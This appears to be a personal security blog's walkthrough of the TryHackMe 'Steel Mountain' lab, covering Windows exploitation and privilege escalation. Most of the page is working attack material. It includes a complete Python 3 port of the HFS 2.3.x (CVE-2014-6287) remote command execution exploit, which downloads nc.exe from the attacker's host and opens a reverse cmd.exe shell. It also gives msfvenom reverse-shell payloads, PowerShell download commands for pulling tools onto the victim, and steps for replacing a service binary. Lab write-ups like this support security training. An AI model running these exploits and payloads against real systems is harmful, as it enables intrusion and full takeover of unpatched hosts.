<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Stell Mountain - Analyst</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <link rel="icon" href="https://bakerst221b.com/favicon.png">
  <link href="/css/style-classic.css"></link>
  
  
  <link rel="stylesheet" href="/css/style.min.564b5f4faf3af87992cb8ab298314448914c22dbdb3f2f9c584546b21b8d407c.css">
  

  

</head>

<body class='page page-default-single'>
  <div id="main-menu-mobile" class="main-menu-mobile">
  <ul>
    
    
    <li class="menu-item-home üè°">
      <a href="/">
        <span>Home üè°</span>
      </a>
    </li>
    
    <li class="menu-item-blog ‚úçÔ∏è">
      <a href="/docs/blog">
        <span>Blog ‚úçÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-dfir üîç">
      <a href="/docs/dfir">
        <span>DFIR üîç</span>
      </a>
    </li>
    
    <li class="menu-item-crypto üóùÔ∏è">
      <a href="/docs/cryptography">
        <span>Crypto üóùÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-reverse üîß">
      <a href="/docs/reverse">
        <span>Reverse üîß</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit üß∞">
      <a href="/docs/toolkit">
        <span>Toolkit üß∞</span>
      </a>
    </li>
    
    <li class="menu-item-threat hunting ü™§">
      <a href="/docs/thunting">
        <span>Threat Hunting ü™§</span>
      </a>
    </li>
    
    <li class="menu-item-about me üßùüèΩ‚Äç‚ôÄÔ∏è">
      <a href="/docs/about">
        <span>About me üßùüèΩ‚Äç‚ôÄÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference üìö">
      <a href="/docs/reference">
        <span>Tech Reference üìö</span>
      </a>
    </li>
    
  </ul>
</div>
  <div class="wrapper">
    <div class='header'>
  <div class="container">
    <div class="logo">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo.png" /></a>
    </div>
    <div class="logo-mobile">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo-mobile.svg" /></a>
    </div>
    

    <div id="main-menu" class="main-menu">
  <ul>
    
    
    <li class="menu-item-home üè°">
      <a href="/">
        <span>Home üè°</span>
      </a>
    </li>
    
    <li class="menu-item-blog ‚úçÔ∏è">
      <a href="/docs/blog">
        <span>Blog ‚úçÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-dfir üîç">
      <a href="/docs/dfir">
        <span>DFIR üîç</span>
      </a>
    </li>
    
    <li class="menu-item-crypto üóùÔ∏è">
      <a href="/docs/cryptography">
        <span>Crypto üóùÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-reverse üîß">
      <a href="/docs/reverse">
        <span>Reverse üîß</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit üß∞">
      <a href="/docs/toolkit">
        <span>Toolkit üß∞</span>
      </a>
    </li>
    
    <li class="menu-item-threat hunting ü™§">
      <a href="/docs/thunting">
        <span>Threat Hunting ü™§</span>
      </a>
    </li>
    
    <li class="menu-item-about me üßùüèΩ‚Äç‚ôÄÔ∏è">
      <a href="/docs/about">
        <span>About me üßùüèΩ‚Äç‚ôÄÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference üìö">
      <a href="/docs/reference">
        <span>Tech Reference üìö</span>
      </a>
    </li>
    
  </ul>
</div>
    
    <button id="toggle-main-menu-mobile" class="hamburger hamburger--slider" type="button">
  <span class="hamburger-box">
    <span class="hamburger-inner"></span>
  </span>
</button>
    
    <div style="margin-left: 20pt;">
      <a href="/index.xml" type="application/rss+xml">
        <img src="/images/rss.png" alt="RSS Feed">
      </a>
    </div>
    
    <style>
      a[href="/index.xml"] {
        display: inline-block;
        vertical-align: middle;
        margin-right: 10px;
      }
    
      a[href="/index.xml"] img {
        height: 30px;
      }
    </style>
    
  </div>
</div>


    
    
    
    
    
    

    
    <div class="container pt-2 pt-md-6 pb-3 pb-md-6">
      <div class="row">
        <div class="col-12 col-md-3 mb-3">
          <div class="sidebar">
            
<div class="docs-menu">
  <p>
   <a href="/docs/notes/labs/red/"> üëàüèº Back to </br> Ethical Hacking </a>
  </p>
  <aside>
   <nav id="TableOfContents">
  <ul>
    <li><a href="#-rtfm-metasploit">üìï RTFM (Metasploit)</a></li>
    <li><a href="#-rtfm-manual">üìï RTFM (Manual)</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>
 </aside>
</div>



          </div>
        </div>
        <div class="col-12 col-md-9">
          
<h1 class="title">Stell Mountain</h1>
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    <div class="meta">
      
      

      
      

      
    </div>
    
    <b>Created:</b> 28.07.2022
    <br />

    

  </header>


  <div class="content" itemprop="articleBody">
    <blockquote>
<p>The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.</p>
</blockquote>
<h2 id="-rtfm-metasploit">üìï RTFM (Metasploit)</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># get the PowerUp.ps1 script for Windows (see in the DFIR section)</span>
</span></span><span class="line"><span class="cl">wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msfconsole
</span></span><span class="line"><span class="cl">search rejetto <span class="c1"># you can use spoitsearch first to find relevant exploits that can later be imported into metasploit.</span>
</span></span><span class="line"><span class="cl">use exploit/windows/http/rejetto_hfs_exec
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 
</span></span><span class="line"><span class="cl"><span class="nb">set</span> RPORT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">upload /path/to/PowerUp.ps1/script/on/the/attacker<span class="se">\&#39;</span>s/machine 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">load powershell
</span></span><span class="line"><span class="cl">powershell_shell
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">. .<span class="se">\P</span>owerUp.ps1 <span class="c1"># yes, . .\PowerUp.ps1, not just .\PowerUp.ps1</span>
</span></span><span class="line"><span class="cl">Invoke-AllChecks <span class="c1"># Lists all misconfigs that can leas to PE.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Abusing a legit Service Path</span>
</span></span><span class="line"><span class="cl"><span class="c1"># https://www.mandiant.com/resources/blog/shikata-ga-nai-encoder-still-going-strong</span>
</span></span><span class="line"><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.7.88 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span> -e x86/shikata_ga_nai -f exe-service -o ServiceToAbuse.exe
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter&gt; shell
</span></span><span class="line"><span class="cl">sc stop ServiceToAbuse <span class="c1"># if the service is started, you won&#39;t be able to overwrite it. You will get &#34;process is being used&#34; error</span>
</span></span><span class="line"><span class="cl">meterpreter&gt; <span class="nb">cd</span> /path/to/the/service/to/abuse <span class="c1"># shell and meterpreter might have differnt current paths</span>
</span></span><span class="line"><span class="cl">meterpreter&gt; upload /path/to/venom/exe/on/attacking/machine <span class="c1"># uploading the service will overwrite the ligit one</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Run a listener. Option #1: netcat</span>
</span></span><span class="line"><span class="cl">nc -l -p <span class="m">4443</span> <span class="c1"># the same specified in the msfvenom command</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ‚ùóÔ∏è Run a listener. Option #2: msfconsole (use a different msfconsole Terminal)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the module to use is called exploit/multi/handler </span>
</span></span><span class="line"><span class="cl">use exploit/multi/handler
</span></span><span class="line"><span class="cl"><span class="nb">set</span> LHOST &lt;attacker<span class="se">\&#39;</span>s IP&gt;
</span></span><span class="line"><span class="cl"><span class="nb">set</span> LPORT &lt;attacker<span class="se">\&#39;</span>s Port&gt; <span class="c1"># the same specified in the msfvenom command</span>
</span></span><span class="line"><span class="cl">run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter&gt; shell
</span></span><span class="line"><span class="cl">sc start ServiceToAbuse <span class="c1"># if the service is started, you won&#39;t be able to overwrite it. You will get &#34;process is being used&#34; error</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># check your listener</span>
</span></span></code></pre></div><p>PowerUp.ps1 and winPEAS are two different ways to do the job.</p>
<blockquote>
<p><em>Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!</em></p>
</blockquote>
<p><a href="https://www.exploit-db.com/exploits/39161">https://www.exploit-db.com/exploits/39161</a>
standalone netcat - <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe</a></p>
<h2 id="-rtfm-manual">üìï RTFM (Manual)</h2>
<p>Let&rsquo;s asume the following:</p>
<ol>
<li>My attacking machine&rsquo;s IP is <code>X.X.X.X</code>
<ol>
<li>The first netcat listner is sitting on port <code>YYYY</code> (normal user session)</li>
<li>My python webser is listening on port <code>80</code> (webser hosting <code>nc.exe</code>)</li>
<li>My second netcat listener is sitting on port <code>ZZZZ</code> (elevated session)</li>
</ol>
</li>
<li>My victim machine&rsquo;s IP is <code>S.S.S.S</code></li>
</ol>
<p>Steps:</p>
<ol>
<li>Download the <a href="https://www.exploit-db.com/exploits/39161">exploit script</a> (see the update script for Python 3 below).</li>
<li>Download <a href="https://github.com/carlospolop/PEASS-ng/releases/download/20230205/winPEASx64.exe">winPEAS</a>.</li>
<li>Download standalone <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">netcat</a>.
<ol>
<li>Rename it to <code>nc.exe</code> (since the exploit is looking for <code>nc.exe</code> and on github it&rsquo;s called <code>ncat.exe</code> instead).</li>
</ol>
</li>
<li>Download <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk.exe</a>.</li>
<li>From whatever directory you have saved the above executables in, run the followng command in the Terminal/console: <code>python -m http.server 80</code>. Note, that the port is set to <code>80</code>. On TryHackMe you won&rsquo;t be able to do that easily with an Attack Machine since the port is occupied by some python remote desktop process. In order to make it work, you need to modify the <code>vba</code> script and explicitly specify a different port (<code>vbs</code> variable). Make sure to URL encode the <code>:80</code> before adding. You can also rename the <code>nc.exe</code> to <code>ncat.exe</code>, instead of renaming the executable itself. Your call.</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="c">&#39; from 
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="n">xHttp</span><span class="p">.</span><span class="n">Open</span> <span class="s">&#34;GET&#34;</span><span class="p">,</span> <span class="s">&#34;http://&#34;</span><span class="o">+</span><span class="n">ip_addr</span><span class="o">+</span><span class="s">&#34;/nc.exe&#34;</span><span class="p">,</span> <span class="k">False</span>
</span></span><span class="line"><span class="cl"><span class="c">&#39;to
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="n">xHttp</span><span class="p">.</span><span class="n">Open</span> <span class="s">&#34;GET&#34;</span><span class="p">,</span> <span class="s">&#34;http://&#34;</span><span class="o">+</span><span class="n">ip_addr</span><span class="o">+</span><span class="s">&#34;:80/nc.exe&#34;</span><span class="p">,</span> <span class="k">False</span>
</span></span></code></pre></div><ol start="6">
<li>Run <code>nc -l YYYY</code> on the attacker&rsquo;s machine so that when <code>nc_run()</code> function is run, nc.exe downloaded from your python-powered server could connect to your machine.</li>
<li>Run the script itself with <code>python -m 39161.py S.S.S.S 8080</code> (note that <code>39161.py</code> is the default name for this exploit and it might be different in future). If no errors are shown, but the pyton server doesn&rsquo;t show any activity and <code>nc</code> doesn&rsquo;t receive any connections, rerun the exploit several times.</li>
<li>Monitor the Terminal with python server running to see if the exploit worked (set up on step 7).</li>
<li>Monitor the Terminal with netcat running to see if any remote session was successfully established (set up on step 6).</li>
<li>Now, in the Terminal window with the nc session successfully established, check the user by running <code>whoami</code>. If all is ok, then run the following powershell command to download <code>winPEAS.exe</code> (to check for misconfigurations that allow privelege escalation) and <code>accesschk.exe</code> (to check file and folder permissions). Sometimes with mac, when you copy a string with a singe quote, it changes it to a `. If powershell complains, check the quotes and better overwrite them manually.</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-c</span> <span class="p">(</span><span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;http://X.X.X.X/winPEAS.exe&#39;</span><span class="p">,</span><span class="s1">&#39;C:\Program Files (x86)\IObit\winpeas.exe&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-c</span> <span class="p">(</span><span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;http://X.X.X.X/accesschk.exe&#39;</span><span class="p">,</span><span class="s1">&#39;C:\Program Files (x86)\IObit\achk.exe&#39;</span><span class="p">)</span>
</span></span></code></pre></div><ol start="11">
<li>If all is ok and the files were copied successfully (try Desktop to save them), run <code>winpeas.exe</code>. In this lab we were provided a hint that we can exploit some unquoted service path. You can run <code>winpeas.exe quiet servicesinfo</code> to see only services&rsquo; vulnerabilities. Our aim is to find the service that:
<ol>
<li>Runs with admin (SYSTEM) rights;</li>
<li>The current user (in this case, bill) can start and stop it;</li>
<li>The current use can wrte to the directory the service executable is stored at.</li>
</ol>
</li>
<li>For each service check if they satisfy every requirement listed above with <code>achk.exe /accepteula -ucqv &lt;servicename&gt;</code>.
<ol>
<li>
<ul>
<li><code>-u</code> stands for &ldquo;user&rdquo; and returns information about the user account the specified service runs under.</li>
</ul>
</li>
<li><code>-c</code> indicates that the user account must have the &ldquo;Log on as a service&rdquo; right.</li>
<li><code>-q</code> specifies that the output should be in a quiet mode, i.e., with minimal output.</li>
<li><code>-v</code> is for verbose mode and provides more detailed information.</li>
</ol>
</li>
<li>Since it&rsquo;s the unquoted service path vulnerability, we need to upload our executable with a specific name. Read more about this type of vulnerabilty here [<a href="#3">3</a>].</li>
</ol>
<p>The exploit script was written for Python 2, so I had to add parentheses to the <code>print</code> function. It also used an outdated library, so I had to change the calls from <code>urllib2</code> to <code>urllib3</code> and the function it was calling, since they are two completely different libraries. To make troubleshooting easier, I added <code>try-except</code> blocks.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/Users/sherlock/.pyenv/versions/3.9.11/envs/python39/bin/python</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Title: HttpFileServer 2.3.x Remote Command Execution</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Google Dork: intext:&#34;httpfileserver 2.3&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Date: 04-01-2016</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Remote: Yes</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Author: Avinash Kumar Thapa aka &#34;-Acid&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Vendor Homepage: http://rejetto.com/</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Software Link: http://sourceforge.net/projects/hfs/</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Version: 2.3.x</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Tested on: Windows Server 2008 , Windows 8, Windows 7</span>
</span></span><span class="line"><span class="cl"><span class="c1"># CVE : CVE-2014-6287</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Description: You can use HFS (HTTP File Server) to send and receive files.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#	       It&#39;s different from classic file sharing because it uses web technology to be more compatible with today&#39;s Internet.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#	       It also differs from classic web servers because it&#39;s very easy to use and runs &#34;right out-of-the box&#34;. Access your remote files, over the network. It has been successfully tested with Wine under Linux. </span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#Usage : python Exploit.py &lt;Target IP address&gt; &lt;Target Port Number&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#EDB Note: You need to be using a web server hosting netcat (http://&lt;attackers_ip&gt;:80/nc.exe).  </span>
</span></span><span class="line"><span class="cl"><span class="c1">#          You may need to run it multiple times for success!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="nf">script_create</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">		<span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">http</span> <span class="o">=</span> <span class="n">urllib3</span><span class="o">.</span><span class="n">PoolManager</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">			<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;/?search=%00{.+&#34;</span><span class="o">+</span><span class="n">save</span><span class="o">+</span><span class="s2">&#34;.}&#34;</span>
</span></span><span class="line"><span class="cl">			<span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;All good! script_create executed.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;script_create failed: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="nf">execute_script</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">		<span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">http</span> <span class="o">=</span> <span class="n">urllib3</span><span class="o">.</span><span class="n">PoolManager</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">			<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;/?search=%00{.+&#34;</span><span class="o">+</span><span class="n">exe</span><span class="o">+</span><span class="s2">&#34;.}&#34;</span>
</span></span><span class="line"><span class="cl">			<span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;All good! execute_script executed.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;execute_script failed: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="nf">nc_run</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">		<span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">http</span> <span class="o">=</span> <span class="n">urllib3</span><span class="o">.</span><span class="n">PoolManager</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">			<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34;/?search=%00{.+&#34;</span><span class="o">+</span><span class="n">exe1</span><span class="o">+</span><span class="s2">&#34;.}&#34;</span>
</span></span><span class="line"><span class="cl">			<span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;All good! nc_run executed.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;nc_run failed: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ip_addr</span> <span class="o">=</span> <span class="s2">&#34;X.X.X.X&#34;</span> <span class="c1">#local IP address</span>
</span></span><span class="line"><span class="cl">	<span class="n">local_port</span> <span class="o">=</span> <span class="s2">&#34;YYYY&#34;</span> <span class="c1"># Local Port number</span>
</span></span><span class="line"><span class="cl">	<span class="n">vbs</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;C:\Users\Public\script.vbs|dim</span><span class="si">%20x</span><span class="s2">Http%3A%20Set</span><span class="si">%20x</span><span class="s2">Http</span><span class="si">%20%</span><span class="s2">3D</span><span class="si">%20c</span><span class="s2">reateobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm</span><span class="si">%20%</span><span class="s2">3D</span><span class="si">%20c</span><span class="s2">reateobject(%22Adodb.Stream%22)%0D%0AxHttp.Open</span><span class="si">%20%</span><span class="s2">22GET</span><span class="si">%22%</span><span class="s2">2C</span><span class="si">%20%</span><span class="s2">22http%3A</span><span class="si">%2F%2F</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">ip_addr</span><span class="o">+</span><span class="s2">&#34;</span><span class="si">%2F</span><span class="s2">nc.exe</span><span class="si">%22%</span><span class="s2">2C</span><span class="si">%20F</span><span class="s2">alse%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20.type</span><span class="si">%20%</span><span class="s2">3D</span><span class="si">%201%</span><span class="s2">20</span><span class="si">%27%</span><span class="s2">2F</span><span class="si">%2F</span><span class="s2">binary%0D%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20.open%0D%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20.write</span><span class="si">%20x</span><span class="s2">Http.responseBody%0D%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20.savetofile</span><span class="si">%20%</span><span class="s2">22C%3A%5CUsers%5CPublic%5Cnc.exe</span><span class="si">%22%</span><span class="s2">2C</span><span class="si">%202%</span><span class="s2">20</span><span class="si">%27%</span><span class="s2">2F</span><span class="si">%2F</span><span class="s2">overwrite%0D%0Aend%20with&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="n">save</span><span class="o">=</span> <span class="s2">&#34;save|&#34;</span> <span class="o">+</span> <span class="n">vbs</span>
</span></span><span class="line"><span class="cl">	<span class="n">vbs2</span> <span class="o">=</span> <span class="s2">&#34;cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="n">exe</span><span class="o">=</span> <span class="s2">&#34;exec|&#34;</span><span class="o">+</span><span class="n">vbs2</span>
</span></span><span class="line"><span class="cl">	<span class="n">vbs3</span> <span class="o">=</span> <span class="s2">&#34;C%3A%5CUsers%5CPublic%5Cnc.exe%20-e</span><span class="si">%20c</span><span class="s2">md.exe%20&#34;</span><span class="o">+</span><span class="n">ip_addr</span><span class="o">+</span><span class="s2">&#34;%20&#34;</span><span class="o">+</span><span class="n">local_port</span>
</span></span><span class="line"><span class="cl">	<span class="n">exe1</span><span class="o">=</span> <span class="s2">&#34;exec|&#34;</span><span class="o">+</span><span class="n">vbs3</span>
</span></span><span class="line"><span class="cl">	<span class="n">script_create</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="n">execute_script</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="n">nc_run</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;[.]Something went wrong..!
</span></span></span><span class="line"><span class="cl"><span class="s2">	Usage is :[.] python exploit.py &lt;Target IP address&gt;  &lt;Target Port Number&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">	Don&#39;t forgot to change the Local IP address and Port number on the script&#34;&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">powershell -c <span class="o">(</span>new-object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">&#39;http://X.X.X.X/Advanced.exe&#39;</span>,<span class="s1">&#39;C:\Program Files (x86)\IObit\Advanced.exe&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>X.X.X.X <span class="nv">LPORT</span><span class="o">=</span>ZZZZ -f exe -o Advanced.exe
</span></span></code></pre></div><h2 id="references">References</h2>
<details>
    <summary>Expand&hellip;</summary>
    <h3 id="1">1</h3>
<p>A great write up for this lab - <a href="https://medium.com/@algobernadortaco/steel-mountain-tryhackme-write-up-w-o-metasploit-c6dd5836ac09">https://medium.com/@algobernadortaco/steel-mountain-tryhackme-write-up-w-o-metasploit-c6dd5836ac09</a> (an option without metasploit).</p>
<h3 id="2-chatgpt">2 ChatGPT</h3>
<p><a href="https://chat.openai.com/chat/">https://chat.openai.com/chat/</a></p>
<h3 id="3">3</h3>
<p><a href="https://gracefulsecurity.com/privesc-unquoted-service-path/">https://gracefulsecurity.com/privesc-unquoted-service-path/</a></p>

</details>

  </div>
</article>
</div>
</div>

        </div>
      </div>
    </div>
    
  </div>

  <div class="sub-footer">
  <div class="container">
    <div class="row">
      <div class="col-12">
        <div class="sub-footer-inner">
          <ul>
            <li class="zerostatic"><a href="https://www.zerostatic.io">www.zerostatic.io</a></li>
            </ul>
        </div>
      </div>
    </div>
  </div>
</div>

  

  
  

  
  <script type="text/javascript" src="/js/scripts.min.302a6fc365d5139fb98cf60bdb8f715d96257ea189161d36c190ccfa8182e569.js"></script>
  

  
  
  
    
  


</body>

</html>
